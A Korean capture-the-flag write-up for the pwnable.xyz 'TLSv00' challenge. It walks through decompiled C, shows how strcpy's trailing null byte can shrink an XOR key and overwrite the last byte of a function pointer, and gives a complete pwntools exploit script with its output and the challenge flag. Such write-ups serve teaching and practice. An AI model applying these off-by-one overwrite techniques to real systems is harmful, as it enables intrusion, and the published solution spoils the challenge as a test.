# [pwnable.xyz] TLSv00

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Transport the flag securely, right?
>
> Release: [TLSv00.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8936995/TLSv00.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/174515438-683949f2-fa1f-4056-831b-657088ce1272.png)

## Analysis

### `generate_key()`

```c
unsigned __int64 __fastcall generate_key(unsigned int len)
{
  signed int i; // [rsp+18h] [rbp-58h]
  int fd; // [rsp+1Ch] [rbp-54h]
  char s[72]; // [rsp+20h] [rbp-50h] BYREF
  unsigned __int64 v5; // [rsp+68h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( (int)len > 0 && len <= 0x40 )
  {
    memset(s, 0, sizeof(s));
    fd = open("/dev/urandom", 0);
    if ( fd == -1 )
    {
      puts("Can't open /dev/urandom");
      exit(1);
    }
    read(fd, s, (int)len);
    for ( i = 0; i < (int)len; ++i )
    {
      while ( !s[i] )
        read(fd, &s[i], 1uLL);
    }
    strcpy(key, s);
    close(fd);
  }
  else
  {
    puts("Invalid key size");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

인자로 받은 길이(`0` 초과, `0x40` 이하)만큼의 encryption key를 생성해서 전역 변수 `key`에 저장한다. `/dev/urandom`에서 랜덤한 문자열을 읽어오는 방식이기 때문에, 완전한 random key가 생성된다.

### `main()`

```c
  puts("Muahaha you thought I would never make a crypto chal?");
  generate_key(0x3FLL);
```

처음에 `0x3f`바이트의 key를 생성한다.

#### 1. Re-generate key

```c
      if ( op != 1 )
        goto LABEL_12;
      printf("key len: ");
      keyLen = (unsigned int)read_int32();
      generate_key(keyLen);
```

`keyLen`을 입력받아서, 그 길이만큼 새로운 key를 생성한다.

#### 2. Load flag

```c
        if ( op != 2 )
          break;
        load_flag();
```

```c
int load_flag()
{
  unsigned int i; // [rsp+8h] [rbp-8h]
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/flag", 0);
  if ( fd == -1 )
  {
    puts("Can't open flag");
    exit(1);
  }
  read(fd, flag, 0x40uLL);
  for ( i = 0; i <= 0x3F; ++i )
    flag[i] ^= key[i];
  return close(fd);
}
```

플래그 파일의 내용을 읽어와서 전역 변수 `flag`에 저장하고, `key`와 한 글자씩 xor 연산을 한다.

#### 3. Print flag

```c
    if ( op == 3 )
    {
      print_flag();
    }
```

```c
__int64 print_flag()
{
  __int64 result; // rax

  puts("WARNING: NOT IMPLEMENTED.");
  result = (unsigned __int8)do_comment;
  if ( !(_BYTE)do_comment )
  {
    printf("Wanna take a survey instead? ");
    if ( getchar() == 'y' )
      do_comment = f_do_comment;
    return do_comment();
  }
  return result;
}
```

함수 포인터 `do_comment`의 마지막 1바이트의 값이 `0x00`이면 `do_comment`에 있는 함수를 호출하는데, 그 전에 질문에 대한 대답으로 `'y'`를 입력하면 `do_comment`에 `f_do_comment()`의 주소를 넣는다.

### `real_print_flag()`

```c
int real_print_flag()
{
  return printf("%s", flag);
}
```

`flag`에 있는 문자열을 출력한다.

## Exploit

### Decrypt flag

플래그가 random key와 xor된 상태로 메모리에 있으면, 읽어올 수 있어도 의미가 없다. 따라서 먼저 key를 없애서 메모리에 실제 플래그가 올라가도록 만들어야 한다.

`generate_key()`에서는 지역 변수 `s`에 먼저 랜덤한 문자열을 만들고 나서 `strcpy()`로 `key`에 복사한다. `strcpy()`는 복사한 문자열의 끝에 `'\x00'`을 붙이기 때문에, 만약 현재 있는 key보다 1바이트 짧은 key를 생성하면 마지막 바이트가 `'\x00'`으로 덮어씌워지면서 `key`의 길이가 1 감소한다. 이 과정을 반복하면 `key`의 길이를 1바이트까지 줄일 수 있다.

```python
# Decrypt flag

for l in range(0x3e, 0, -1):
    regen_key(l)

load_flag()
```

### Print flag

앞의 과정을 거치면 플래그가 맨 앞의 한 글자만 암호화된 상태로 전역 변수 `flag`에 들어가있게 된다. 

전역 변수 `do_comment`에 `real_print_flag()`의 주소를 넣고 `print_flag()`를 실행하면 플래그를 획득할 수 있다.

![image](https://user-images.githubusercontent.com/104156058/174523663-b1eb9053-9713-4bac-bf6f-241cd52df22c.png)

우연찮게 `real_print_flag()`의 주소의 마지막 1바이트가 `0x00`이라서, `do_comment`에 `real_print_flag()`의 주소가 들어가있으면 그대로 이 함수가 실행된다.

![image](https://user-images.githubusercontent.com/104156058/174523877-9b29518f-4598-408a-a2ce-922d9a8088c3.png)

앞에서 `generate_key()`에서 `key`에 랜덤 문자열을 복사할 때 맨 끝에 `'\x00'`이 붙는 것을 이용했었는데, 이번에도 마찬가지로 `0x40`바이트 key를 생성하면 `do_comment`의 마지막 1바이트가 `'\x00'`으로 덮어씌워지는 것을 이용할 수 있다. `do_comment`에 `f_do_comment()`의 주소가 들어가있는 상태에서 마지막 1바이트만 `'\x00'`으로 덮어쓰면 `real_print_flag()`의 주소가 된다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30006)

sla = r.sendlineafter
sa = r.sendafter

def regen_key(key_len):
    sla('> ', '1')
    sla('key len: ', str(key_len))

def load_flag():
    sla('> ', '2')

def print_flag(survey, comment):
    sla('> ', '3')
    sa('Wanna take a survey instead? ', survey)
    if survey == 'y':
        sa('Enter comment: ', comment)


# write address of real_print_flag() on do_comment

print_flag('y', 'a')

regen_key(0x40)


# Decrypt flag

for l in range(0x3f, 0, -1):
    regen_key(l)

load_flag()


# print flag

print_flag('n', 'a')


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30006: Done
[*] Switching to interactive mode
\x16AG{this_was_called_OTP_I_think}
```